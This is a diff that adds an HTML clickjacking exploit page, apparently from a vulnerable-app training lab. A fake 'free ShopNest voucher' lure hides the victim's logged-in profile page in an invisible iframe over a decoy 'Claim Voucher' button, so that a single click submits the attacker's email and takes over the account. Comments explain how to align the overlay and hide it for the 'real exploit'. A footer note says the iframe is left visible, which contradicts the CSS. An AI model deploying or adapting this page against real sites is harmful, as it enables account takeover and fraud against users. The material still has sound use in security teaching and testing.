@@ -1,0 +1,49 @@
+<!doctype html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>🎉 You've Won a Free ShopNest Voucher!</title>
+  <style>
+    body{ font-family:sans-serif; background:#f5f7fa; text-align:center; padding:40px; }
+    .wrapper{ position:relative; width:520px; height:260px; margin:0 auto; }
+    iframe{
+      position:absolute; top:0; left:0; width:520px; height:260px;
+      opacity:0.0; /* set to e.g. 0.15 while you're aligning it, 0 for the real exploit */
+      border:none; z-index:2;
+    }
+    .decoy-btn{
+      position:absolute; z-index:1;
+      /* Position this to sit exactly over the real "Update email" button
+         in the iframed /profile/<id> page. Use the visible-opacity mode
+         above to line it up, then set opacity back to 0. */
+      top:150px; left:170px; width:150px; height:38px;
+      background:#ff6a3d; color:#fff; border:none; border-radius:6px; font-weight:bold; cursor:pointer;
+    }
+    .card{ background:#fff; border-radius:12px; padding:24px; box-shadow:0 4px 20px rgba(0,0,0,.1); display:inline-block; }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <h2>Congratulations! 🎁</h2>
+    <p>You've been selected for a free ₹500 ShopNest voucher.<br>Click below to claim it.</p>
+    <div class="wrapper">
+      <!-- The decoy button the victim actually sees and clicks -->
+      <button class="decoy-btn">Claim Voucher</button>
+      <!--
+        The real, logged-in-as-victim settings page is loaded invisibly on top.
+        Because ShopNest sends no X-Frame-Options / frame-ancestors CSP header,
+        this iframe is allowed to load at all. Pre-fill the email field via the
+        'email' query param below so the victim's one click submits YOUR email
+        into their account -> silent account/email takeover.
+      -->
+      <iframe src="{{ url_for('profile', uid=uid, _external=True) }}"></iframe>
+    </div>
+    <p style="font-size:12px;color:#888;margin-top:16px;">
+      Lab notes: this page intentionally leaves the iframe fully visible (opacity via inline style)
+      for learning — flip <code>iframe { opacity: 0; }</code> in this file's &lt;style&gt; to run the
+      real invisible-overlay version once you've confirmed alignment. Full walkthrough in
+      VULN_GUIDE.md #1, including how to auto-fill and pre-target the hidden form field.
+    </p>
+  </div>
+</body>
+</html>
